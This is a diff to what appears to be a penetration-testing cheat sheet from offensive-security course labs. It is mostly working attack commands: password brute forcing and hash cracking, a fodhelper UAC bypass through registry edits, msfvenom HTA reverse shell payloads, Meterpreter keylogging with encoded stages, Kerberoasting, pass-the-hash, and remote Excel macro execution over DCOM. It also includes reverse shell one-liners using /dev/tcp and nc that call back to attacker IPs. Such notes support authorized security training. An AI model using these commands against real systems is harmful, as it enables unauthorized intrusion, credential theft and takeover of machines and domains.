@@ -181,6 +181,13 @@ smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
 crackmapexec smb 192.168.50.242 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares  
 ```
 
+Mount SMB share on linux
+
+```bash
+sudo mkdir /mnt/win10_share
+sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
+```
+
 SMB signing set to False => we can potentially perform relay attacks if we can force an authentication request (impacket-ntlmrelayx)
 
 ## NFS Enumeration
@@ -829,6 +836,8 @@ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --a
 </html>
 ```
 
+Create a payload for an HTA attack since it contains the Base64 encoded payload to be used with PowerShell `powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....`
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
 ```
@@ -991,6 +1000,7 @@ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 gzip -d rockyou.txt.gz
 
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+
 hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
 
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
@@ -998,9 +1008,34 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 ```
 
+HTTP htaccess Attack with Medusa
+
+Attempt to gain access to an htaccess-protected folder, /admin
+
+```bash
+medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+```
+
+Remote Desktop Protocol Attack with Crowbar
+
+```bash
+sudo apt install crowbar
+crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
+```
+
 ## Password Cracking
 
+hash type identification
+
+```bash
+hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
+```
+
 ### Mutating Wordlists
+
+```bash
+cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+```
 
 Delete all lines starting with a "1"
 
@@ -1008,10 +1043,23 @@ Delete all lines starting with a "1"
 sed -i '/^1/d' demo.txt
 ```
 
-Generate a custom wordlist, set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first 3 characters to Lab followed by three numeric digits
+Generate a custom wordlist, set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first 3 characters to Lab followed by three numeric digits, path to the character set file (-f)
+
+* @:	Lower case alpha characters
+* ,:	Upper case alpha characters
+* %:	Numeric characters
+* ^:	Special characters including space
+
+The mixed alpha set mixalpha, which includes all lower and upper case letters
 
 ```bash
 crunch 6 6 -t Lab%%% > wordlist
+
+crunch 8 8 -t ,@@^^%%%
+
+crunch 4 6 0123456789ABCDEF -o crunch.txt
+
+crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
 ```
 
 #### Rule file for Hashcat
@@ -1031,6 +1079,8 @@ Display the mutated passwords
 
 ```bash
 hashcat -r demo.rule --stdout demo.txt
+
+john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
 ```
 
 ### Crack MD5
@@ -1051,6 +1101,15 @@ keepass2john Database.kdbx > keepass.hash
 hashcat --help | grep -i "KeePass"
 
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+```
+
+### Crack Linux-based hashes with JTR
+
+combine the passwd and shadow files from the compromised system
+
+```bash
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
 
 ### SSH Private Key Passphrase
@@ -1115,6 +1174,8 @@ lsadump::sam
 hashcat --help | grep -i "ntlm"
 
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
 ```
 
 ### Passing NTLM
@@ -1273,11 +1334,35 @@ From Windows Vista onward, processes run on 4 integrity levels:
 
 Display the integrity level of processes with **Process Explorer** for our current user with `whoami /groups`, and for files with **icacls**.
 
+Switch to a high integrity level 
+
+```bat
+powershell.exe Start-Process cmd.exe -Verb runAs
+```
+
 **User Account Control (UAC)** protects the OS by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains 2 access tokens after a successful logon.
 
 1. **Standard user token** (or filtered admin token), which is used to perform all non-privileged operations.
 
 2. **Regular administrator token** will be used when the user wants to perform a privileged operation. To leverage the administrator token, a **UAC consent prompt** needs to be confirmed.
+
+Application manifest is an XML file containing information that lets the operating system know how to handle the program when it is started
+
+Inspect the manifest with utility from Sysinternals
+
+```bat
+sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+```
+
+fodhelper tries to access the ms-setting registry key within the HKCU hive first. fodhelper.exe attempts to query a value (DelegateExecute) stored in our newly-created command key. since we do not want to hijack the execution through a COM object, we'll add a DelegateExecute entry, leaving its value empty. When fodhelper discovers this empty value, it will look for a program to launch specified in the `Shell\Open\command\Default` key entry.
+
+```bat
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+```
 
 Example **Built-in groups** include Administrators, **Backup Operators**, **Remote Desktop Users**, and **Remote Management Users**.
 
@@ -1379,7 +1464,7 @@ mountvol
 
 Enumerating Device Drivers and Kernel Modules
 
-```
+```pwsh
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
 ```
 
@@ -1397,6 +1482,11 @@ reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
+--dump to view output, and -G to list groups
+
+```bat
+windows-privesc-check2.exe --dump -G
+```
 
 ## Hidden in Plain View
 
@@ -1470,6 +1560,8 @@ When using a network logon such as WinRM or a bind shell, `Get-CimInstance` and 
 
 ```pwsh
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
 ```
 
 **Replacing the binary of a service** needs permissions.
@@ -1504,6 +1596,8 @@ net stop mysql
 
 ```pwsh
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+wmic service where caption="Serviio" get name, caption, state, startmode
 ```
 
 Get a list of all privileges, The **Disabled** state only indicates if the privilege is currently enabled for the running process
@@ -1756,7 +1850,7 @@ ip route
 netstat
 ss -anp
 ss -ntplu
-sudo ss -antlp | grep sshd
+ss -antlp | grep sshd
 ```
 
 Files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user
@@ -1933,6 +2027,25 @@ Run this command on CONFLUENCE to open TCP port 2345 on the WAN interface of CON
 
 ```bash
 socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+```
+
+```bash
+sudo apt install rinetd
+```
+
+To redirect any traffic received by the Kali web server on port 80 to the google.com IP address
+
+`/etc/rinetd.conf`
+
+```
+...
+# bindadress    bindport  connectaddress  connectport
+0.0.0.0 80 216.58.207.142 80
+...
+```
+
+```bash
+sudo service rinetd restart
 ```
 
 ## SSH Tunneling
@@ -2124,6 +2237,19 @@ Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080` (same result as the abo
 
 ```bash
 proxychains ssh database_admin@10.4.50.215
+```
+
+HTTPTunnel-ing
+
+```bash
+sudo apt install httptunnel
+```
+
+```bash
+ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+hts --forward-port localhost:8888 1234
+htc --forward-port 8080 10.11.0.128:1234
+rdesktop 127.0.0.1:8080
 ```
 
 ## DNS Tunneling
@@ -2445,6 +2571,14 @@ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
 
 ### Meterpreter Command
 
+```
+screenshot
+
+keyscan_start
+keyscan_dump
+keyscan_stop
+```
+
 Retrieve LM/NTLM creds (parsed)
 ```
 load kiwi
@@ -2481,6 +2615,8 @@ use exploit/multi/handler
 set PAYLOAD windows/meterpreter_reverse_https
 set LHOST 192.168.119.4
 set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
 set AutoRunScript post/windows/manage/migrate
 set ExitOnSession false
 run -z -j
@@ -2596,13 +2732,15 @@ LDAPSearch -LDAPQuery "(samAccountType=805306368)"
 
 LDAPSearch -LDAPQuery "(objectclass=group)"
 
-foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties \ select {$_.cn}, {$_.member} }
+foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }
 
 $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
 $sales.properties.member
 
 $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
 $group.properties.member
+
+LDAPSearch -LDAPQuery "serviceprincipalname=*http*"
 ```
 
 ```pwsh
@@ -2886,8 +3024,6 @@ The output shows both a TGT and a TGS. Stealing a TGS would allow us to access o
 sekurlsa::tickets
 ```
 
-Mimikatz can also export tickets to the hard drive and import tickets into LSASS.
-
 Microsoft provides the AD role Active Directory Certificate Services (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources.
 
 If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates (and much more). 
@@ -3022,6 +3158,25 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 
 ```bash
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Request the service ticket (the registered SPN for the IIS web server in the domain is HTTP/CorpWebServer.corp.com)
+
+```pwsh
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+```
+
+Mimikatz can also export tickets to the hard drive and import tickets into LSASS.
+
+```
+kerberos::list /export
+```
+
+```bash
+sudo apt install kerberoast
+
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi 
 ```
 
 ### Silver Tickets
@@ -3212,6 +3367,12 @@ This method works for Active Directory domain accounts and the built-in local **
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
 ```
 
+pth-toolkit
+
+```bash
+pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+```
+
 ## Overpass the Hash
 
 With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
@@ -3277,12 +3438,34 @@ Microsoft Management Console (MMC) COM application is employed for scripted auto
 
 The MMC Application Class allows the creation of Application Objects, which expose the **ExecuteShellCommand** method under the **Document.ActiveView** property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
 
+Discover its available methods and objects using the Get-Member cmdlet
+
 The ExecuteShellCommand method accepts 4 parameters: Command, Directory, Parameters, and WindowState.
 
 ```pwsh
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
 
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e ...","7")
+```
+
+Run macro in a workbook remotely
+
+```pwsh
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
 ```
 
 ## Golden Ticket
@@ -3292,6 +3475,7 @@ When a user submits a request for a TGT, the KDC encrypts the TGT with a secret 
 If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, aka golden tickets.
 
 Extract the password hash of the krbtgt account with Mimikatz
+
 ```
 privilege::debug
 lsadump::lsa /patch
@@ -3310,7 +3494,6 @@ Before generating the golden ticket, we'll:
 - Supply the domain SID (which we can gather with `whoami /user`) to the Mimikatz `kerberos::golden` command
 
 Use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022, we'll need to provide an existing account, e.g., jen
-
 
 ```
 kerberos::purge
@@ -3402,7 +3585,7 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 ```
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f
 ```
 
 ```bash
